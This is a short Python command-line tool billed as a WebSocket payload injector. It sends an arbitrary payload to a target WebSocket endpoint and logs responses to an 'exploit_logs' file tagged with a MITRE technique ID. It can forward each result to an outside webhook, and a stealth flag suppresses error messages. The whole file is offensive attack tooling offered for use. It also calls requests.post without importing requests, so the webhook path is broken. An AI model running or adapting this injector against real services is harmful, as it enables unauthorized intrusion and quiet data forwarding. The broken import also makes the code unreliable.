import asyncio
import websockets
import argparse
import json
from datetime import datetime
import os
import uuid

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1071.001"  # Application Layer Protocol: WebSockets

def log_result(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(existing, f, indent=2)

async def inject_payload(ws_url, payload, stealth=False, webhook=None):
    session_id = str(uuid.uuid4())
    try:
        async with websockets.connect(ws_url) as websocket:
            await websocket.send(payload)
            response = await websocket.recv()
            print(f"[+] Payload sent to {ws_url}")
            print(f"[+] Response: {response[:100]}")
            result = {
                "timestamp": datetime.utcnow().isoformat(),
                "target": ws_url,
                "type": "websocket_injection",
                "payload": payload,
                "session_id": session_id,
                "response": response[:100],
                "ttp": MITRE_TTP
            }
            log_result(result)
            if webhook:
                try:
                    requests.post(webhook, json=result, timeout=3)
                except Exception:
                    if not stealth:
                        print("[!] Webhook delivery failed.")
    except Exception as e:
        if not stealth:
            print(f"[!] WebSocket injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WebSocket Payload Injector")
    parser.add_argument("--ws-url", required=True, help="WebSocket endpoint (e.g. ws://target:port/socket)")
    parser.add_argument("--payload", required=True, help="Message to inject")
    parser.add_argument("--stealth", action="store_true", help="Suppress verbose errors")
    parser.add_argument("--webhook", help="Webhook for result forwarding")
    args = parser.parse_args()

    asyncio.run(inject_payload(args.ws_url, args.payload, args.stealth, args.webhook))
